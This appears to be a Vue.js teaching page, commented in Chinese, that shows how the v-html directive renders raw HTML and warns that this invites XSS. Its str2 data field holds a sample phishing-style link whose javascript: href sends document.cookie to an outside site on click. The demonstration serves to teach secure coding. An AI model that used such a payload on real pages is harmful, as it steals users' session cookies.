<!DOCTYPE html>
<html lang='en'>

<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>v-html指令</title>
    <script type='text/javascript' src='../js/vue.js'></script>
</head>

<body>
    <!-- 
    				v-html指令：
    					- 向指定节点中渲染包含html结构的内容。
    					- v-html会替换掉节点中所有的内容。
    					- v-html可以识别html结构。
    					- v-html有安全性问题！网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
    						
    -->
    <div id='root'>
        <div>你好，{{name}}</div>
        <div v-html="str"></div> <!-- v-html可以解析含有html结构的内容 -->
        <div v-html="str2"></div> <!-- 模拟v-html的安全性问题 -->
    </div>
</body>

<script type='text/javascript'>
    new Vue({
        el: '#root',
        data: {
            name: 'Esing',
            str: '<h3 style="color:red">你好啊！</h3>',
            str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
            /*
                javascript: 表示后面的内容为js语句。
                location.href 表示浏览器地址栏中的链接。（自动跳转）
                document.cookie 可以获取到当前页面的cookie。
                由以上拼接的html代码，点击后即可获取到当前页面的cookie，这是非常危险的。
            */
        }
    })
</script>

</html>
